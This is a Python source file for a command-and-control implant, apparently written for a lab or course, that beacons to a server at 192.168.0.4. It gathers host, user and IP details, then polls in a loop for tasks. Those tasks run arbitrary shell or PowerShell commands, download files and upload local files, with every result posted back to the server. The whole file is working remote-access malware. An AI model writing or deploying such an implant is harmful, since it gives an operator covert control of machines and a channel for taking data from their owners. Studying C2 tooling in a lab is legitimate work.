#!/usr/bin/python3

import getpass
import json
import os
import random
import requests
import socket
import string
import subprocess
import sys
import time

from requests.api import request

class Beacon(object):
    def __init__(self):
        self.guid = self.getGUID()
        self.ipAddr = self.getIPaddress()
        self.hostName = socket.gethostname()
        self.user = getpass.getuser()
        self.dir = os.getcwd()
        self.pid = os.getpid()
        self.ppid = os.getppid()

    def getGUID(self):
        # this is one way of making a randomized GUID
        letters = string.ascii_letters
        numbers = string.digits
        random_letters = "".join(random.choice(letters) for i in range(8))
        random_numbers = "".join(random.choice(numbers) for i in range(4))
        s = random_letters + random_numbers
        l = list(s)
        random.shuffle(l)
        guid = "".join(l)

        # however, we will likely use static GUIDs so that
        # we can copy and paste commands without
        # substituting unique GUIDs each evaluation
        guid = "1u42om9cWRUR"
        return guid

    def getIPaddress(self):
        # this is hacky, but it works
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 53))
        ipAddr = s.getsockname()[0]
        s.close()
        return ipAddr

def sleep():
    sleep_interval = random.randint(1,3)
    print(f"Going to sleep for {sleep_interval} seconds")
    time.sleep(sleep_interval)


def main():

    # create beacon object
    beacon = Beacon()

    # convert beacon data into JSON
    beacon_json = json.dumps(vars(beacon))

    # assign C2 Handler endpoints to variables
    url_register_implant = "http://192.168.0.4:8080/register"
    url_get_task = "http://192.168.0.4:8080/task/" + beacon.guid
    url_post_output = "http://192.168.0.4:8080/output/" + beacon.guid
    url_put_file = "http://192.168.0.4:8080/putFile/"

    # setup random number seed
    random.seed()

    # start C2 loop
    print("Starting C2 loop")
    while True:
        
        # go to sleep
        sleep()

        # register implant to C2 server
        # run this every loop iteration to be safe
        # the server will just ignore existing implant sessions
        print("Registering implant to C2 server")
        response = requests.post(url_register_implant, beacon_json)
        print(response.text)

        # check for tasks
        print("Checking for tasks")
        response = requests.get(url_get_task)
        task = response.text

        # handle tasks
        if task != "":
            print("Executing task", task)
            
            # terminate implant process
            if task == "die":
                print("Exiting implant")
                status = "terminating implant"
                requests.post(url_post_output, status)
                sys.exit(0)
            
            # this just shows you can make whatever commands you want
            elif task == "dance":
                status = "(>^_^)> I'm doing the happy dance! <(^_^<)"
                requests.post(url_post_output, status)


            # handle downloads
            elif "get-file" in task:
                url = task[9:]
                dest_file = task.rsplit("/", 1)[1]
                response = requests.get(url)
                with open(dest_file, "wb") as file:
                    file.write(str.encode(response.text))
                status = "Wrote file to current working directory"
                requests.post(url_post_output, status)

            # handle uploads
            elif "put-file" in task:
                src_file = task[9:]
                print("Attempting to upload: ", src_file)
                file = open(src_file, "rb")
                data = file.read()
                dest_file = src_file.rsplit("/", 1)[1]
                url = url_put_file + dest_file
                print("POSTING to ", url)
                response = requests.post(url, data)
                print(response)
                sys.exit()

            # run shell commands
            else:
                
                # cross platform setup
                command = ""
                if sys.platform == "win32":
                    command = "powershell.exe"
                else:
                    command = "/bin/sh"

                # run shell command and capture stdout and stderr
                output = subprocess.run([command, "-c", task], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # decode object so that it formats nicely in the terminal
                output = output.stdout.decode("utf-8") + output.stderr.decode("utf-8")

                # send task output to control server
                print("Sending task output")
                requests.post(url_post_output, output)


if __name__ == "__main__":
    main()